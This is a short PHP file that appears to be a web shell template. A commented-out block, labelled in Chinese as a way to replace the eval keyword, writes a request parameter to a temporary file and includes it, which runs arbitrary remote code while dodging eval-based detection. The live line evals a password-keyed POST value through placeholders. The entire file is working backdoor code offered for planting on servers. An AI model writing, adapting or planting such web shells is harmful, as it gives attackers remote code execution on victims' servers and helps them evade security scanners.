<?
/*
1.替代eval 关键字的方式之一
<?php
function update($phpCode) {
    $tmpfname = tempnam("/tmp", "update");
    $handle = fopen($tmpfname, "w+");
    fwrite($handle, "<?php\n" . $phpCode);
    fclose($handle);
    include $tmpfname;
    unlink($tmpfname);
    return get_defined_vars();
}
extract(update($_REQUEST["c"]));
*/
$x=$_POST['%%PASSKEY%%'];eval(%s);

?>
